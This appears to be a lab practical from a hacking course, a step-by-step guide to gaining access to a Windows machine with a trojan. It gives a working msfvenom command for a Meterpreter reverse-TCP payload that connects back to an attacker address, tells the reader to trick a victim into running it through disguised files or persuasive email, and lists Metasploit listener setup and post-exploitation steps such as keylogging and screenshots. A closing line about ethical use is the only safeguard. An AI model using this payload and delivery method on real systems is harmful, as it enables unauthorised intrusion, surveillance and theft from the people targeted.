# Practical-09.md

## Malware Threats: Gain Access to the Target System using Trojans

### Step 1: Introduction
In this practical, we will learn how to gain access to the target system using Trojans, which are a type of malware threat.

### Step 2: Understanding Trojans
Trojans are malicious software that disguise themselves as legitimate programs or files. They are designed to trick users into executing them, thereby gaining unauthorized access to the target system.

### Step 3: Setting up the Environment
Before we begin, make sure you have the following:
- Kali Linux machine (attacker machine)
- Windows machine (victim machine)

### Step 4: Creating a Trojan
1. Open a terminal on your Kali Linux machine.
2. Use a tool like `msfvenom` to create a Trojan payload. For example, you can create a Trojan that provides a reverse shell to the attacker.
   ```
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe > trojan.exe
   ```
   Replace `<attacker_ip>` with the IP address of your Kali Linux machine and `<attacker_port>` with a port number of your choice.

### Step 5: Delivering the Trojan
1. Transfer the generated Trojan (`trojan.exe`) to the victim machine using a method of your choice (e.g., USB drive, email, etc.).
2. Encourage the victim to execute the Trojan on their system. This can be done through social engineering techniques, such as disguising the Trojan as a legitimate file or using persuasive language in an email.

### Step 6: Gaining Access
1. Once the victim executes the Trojan, it establishes a connection back to the attacker's machine.
2. On your Kali Linux machine, launch the Metasploit Framework by typing `msfconsole` in the terminal.
3. Use the `multi/handler` module to listen for incoming connections from the Trojan.
4. Set the required options for the `multi/handler` module, such as the payload and the listening IP and port.
5. Start the listener using the `exploit` command.

### Step 7: Post-Exploitation
1. Once the connection is established, you will have a Meterpreter session.
2. Use the `sessions` command to list all active sessions.
3. Select the session corresponding to the exploited system using the `sessions -i <session_id>` command.
   Replace `<session_id>` with the session ID of the exploited system.
4. Now, you have a Meterpreter shell on the victim machine. You can perform various post-exploitation activities such as:
   - Gathering system information
   - Accessing files and directories
   - Capturing screenshots
   - Keylogging
   - etc.

### Step 8: Cleanup
After completing the post-exploitation activities, it is important to clean up the traces of the attack. Use the following commands:
- `sessions -K` to kill the Meterpreter session.
- `exit` to exit the Metasploit Framework.

### Conclusion
In this practical, we learned how to gain access to the target system using Trojans, which are a type of malware threat. It is important to use these techniques responsibly and only for ethical purposes.

---

That's it for Practical-09. Stay tuned for the next practical!
